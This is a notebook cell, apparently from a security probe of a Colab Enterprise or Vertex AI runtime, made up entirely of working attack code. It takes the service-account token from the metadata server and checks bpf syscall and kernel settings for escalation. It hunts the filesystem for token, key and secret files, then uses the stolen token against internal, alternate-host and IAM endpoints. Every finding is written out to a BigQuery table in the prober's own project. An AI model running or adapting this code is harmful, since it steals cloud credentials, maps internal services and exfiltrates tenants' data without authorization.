In [ ]:
import os, json, subprocess, urllib.request, urllib.error, ctypes
from google.cloud import bigquery

def safe(label, fn):
    try: return {'label': label, 'value': str(fn())[:4500]}
    except Exception as e: return {'label': label, 'value': f'ERR: {type(e).__name__}: {str(e)[:600]}'}

def http(url, timeout=4, headers=None, method='GET', data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return f'{r.status} {r.headers.get("content-type","")} {r.read()[:2000].decode(errors="replace")}'
    except urllib.error.HTTPError as e:
        return f'{e.code} {e.headers.get("content-type","")} {e.read()[:800].decode(errors="replace")}'
    except Exception as e:
        return f'ERR {type(e).__name__}: {str(e)[:300]}'

TOKEN = json.loads(urllib.request.urlopen(urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token', headers={'Metadata-Flavor':'Google'})).read().decode())['access_token']
AUTH = {'Authorization': f'Bearer {TOKEN}'}
AUTH_JSON = {**AUTH, 'Content-Type': 'application/json'}

p = []

# ===== BPF feasibility (CAP_SYS_ADMIN + bpf syscall) =====
libc = ctypes.CDLL('libc.so.6')
BPF_PROG_LOAD = 5
BPF_MAP_CREATE = 0
# Test bpf() syscall is available
p.append(safe('bpf_map_create_test', lambda: libc.syscall(321, BPF_MAP_CREATE, ctypes.c_void_p(0), 0)))
# Check kernel.bpf_stats_enabled
p.append(safe('kernel_bpf_stats', lambda: open('/proc/sys/kernel/bpf_stats_enabled').read().strip()))
p.append(safe('kernel_unprivileged_bpf', lambda: open('/proc/sys/kernel/unprivileged_bpf_disabled').read().strip()))
p.append(safe('kernel_kptr_restrict', lambda: open('/proc/sys/kernel/kptr_restrict').read().strip()))
p.append(safe('kernel_kallsyms', lambda: open('/proc/kallsyms').read()[:500] if os.path.exists('/proc/kallsyms') else 'NO_FILE'))
p.append(safe('kernel_release', lambda: subprocess.check_output(['uname','-r']).decode().strip()))
p.append(safe('kernel_version_proc', lambda: open('/proc/version').read()[:200]))

# ===== Spark Connect / Dataproc service exploration =====
p.append(safe('spark_connect_socket_lookup', lambda: subprocess.check_output(['ss','-tlnp','sport','=',':6000','or','sport','=',':3453','or','sport','=',':4040','or','sport','=',':9000'], stderr=subprocess.STDOUT, timeout=5).decode()))
p.append(safe('localhost_3453', lambda: http('http://localhost:3453/', 2)))
p.append(safe('localhost_9000', lambda: http('http://localhost:9000/', 2)))
p.append(safe('localhost_4040', lambda: http('http://localhost:4040/', 2)))
p.append(safe('localhost_20257', lambda: http('http://localhost:20257/', 2)))
p.append(safe('localhost_43147', lambda: http('http://localhost:43147/', 2)))
p.append(safe('localhost_47561', lambda: http('http://localhost:47561/', 2)))
# Check dataproc service files
p.append(safe('etc_dataproc', lambda: subprocess.check_output(['find','/etc','/opt','-maxdepth','3','-name','*dataproc*','-o','-name','*spark*'], stderr=subprocess.STDOUT, timeout=10).decode()))
p.append(safe('home_creds', lambda: subprocess.check_output(['find','/root','/home','/datalab','-name','*token*','-o','-name','*.key*','-o','-name','*cred*','-o','-name','*secret*'], stderr=subprocess.STDOUT, timeout=10).decode()))
p.append(safe('var_lib_files', lambda: subprocess.check_output(['ls','-la','/var/lib/colab','/var/colab'], stderr=subprocess.STDOUT, timeout=3).decode()[:1500]))

# ===== Internal endpoint enumeration with auth token =====
# Vertex AI specific
for path in ['/v1/projects/bq-ssrf-453453/locations/us-central1/notebookExecutionJobs',
             '/v1/projects/bq-ssrf-453453/locations/us-central1/notebookExecutionJobs?pageSize=100',
             '/v1/projects/bq-ssrf-453453/locations/us-central1/persistentResources',
             '/v1/projects/bq-ssrf-453453/locations/us-central1/operations',
             '/v1/projects/bq-ssrf-453453/locations/us-central1/featurestores',
             '/v1/projects/bq-ssrf-453453/locations/us-central1/metadataStores',
             '/v1/projects/-/locations/us-central1/operations',
             '/v1/projects/-/locations/-/notebookExecutionJobs']:
    p.append(safe(f'vertex{path[:80]}', lambda u=path: http(f'https://us-central1-aiplatform.googleapis.com{u}', headers=AUTH)))

# Dataform internal-ish endpoints
p.append(safe('dataform_internal_v1', lambda: http('https://dataform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/repositories', headers=AUTH)))
p.append(safe('dataform_v1beta2', lambda: http('https://dataform.googleapis.com/v1beta2/projects/bq-ssrf-453453/locations/us-central1/repositories', headers=AUTH)))

# Try CloudResourceManager + IAM
p.append(safe('cloudresourcemanager_v3_projects', lambda: http('https://cloudresourcemanager.googleapis.com/v3/projects?parent=organizations/458526478892', headers=AUTH)))
p.append(safe('iam_list_all_roles', lambda: http('https://iam.googleapis.com/v1/roles?pageSize=5', headers=AUTH)))
p.append(safe('iam_query_grantable_sa', lambda: http('https://iam.googleapis.com/v1/roles:queryGrantableRoles', headers=AUTH_JSON, method='POST', data=b'{"fullResourceName":"//iam.googleapis.com/projects/bq-ssrf-453453/serviceAccounts/56027829814-compute@developer.gserviceaccount.com"}')))

# Try CHEDDAR Internal Vertex endpoints with different host headers
p.append(safe('vertex_alt_host', lambda: http('http://aiplatform-internal.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/notebookRuntimes', headers={**AUTH, 'Host':'aiplatform.googleapis.com'})))
p.append(safe('vertex_private_token', lambda: http('https://aiplatform-private.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/notebookRuntimes', headers=AUTH)))

# Try Colab Enterprise internal endpoints
p.append(safe('colab_enterprise_v1', lambda: http('https://us-central1-aiplatform.googleapis.com/v1beta1/projects/bq-ssrf-453453/locations/us-central1/notebookRuntimes', headers=AUTH)))
p.append(safe('colab_executions', lambda: http('https://us-central1-aiplatform.googleapis.com/v1/projects/bq-ssrf-453453/locations/us-central1/notebookExecutionJobs', headers=AUTH)))
p.append(safe('colab_my_self_metadata', lambda: http('http://169.254.169.254/computeMetadata/v1/instance/attributes/notebook-input-resource-name', headers={'Metadata-Flavor':'Google'})))
p.append(safe('colab_my_output_resource', lambda: http('http://169.254.169.254/computeMetadata/v1/instance/attributes/notebook-output-collection-resource-name', headers={'Metadata-Flavor':'Google'})))

# Use the metadata 'report-event-url' from earlier — could leak internal endpoint
p.append(safe('colab_report_event_url', lambda: http('http://169.254.169.254/computeMetadata/v1/instance/attributes/report-event-url', headers={'Metadata-Flavor':'Google'})))
p.append(safe('colab_user_data', lambda: http('http://169.254.169.254/computeMetadata/v1/instance/attributes/user-data', headers={'Metadata-Flavor':'Google'})))
p.append(safe('colab_runtime_resource_name', lambda: http('http://169.254.169.254/computeMetadata/v1/instance/attributes/resource-url', headers={'Metadata-Flavor':'Google'})))

# Try the report-event-url as POST endpoint
import urllib.parse

client = bigquery.Client(project='bq-ssrf-453453')
table_id = 'bq-ssrf-453453.injected_proof.NBEX_DEEP_PROBE'
schema = [bigquery.SchemaField('label','STRING'), bigquery.SchemaField('value','STRING')]
client.create_table(bigquery.Table(table_id, schema=schema), exists_ok=True)
errs = client.insert_rows_json(table_id, p)
print('rows', len(p), 'errors', errs)
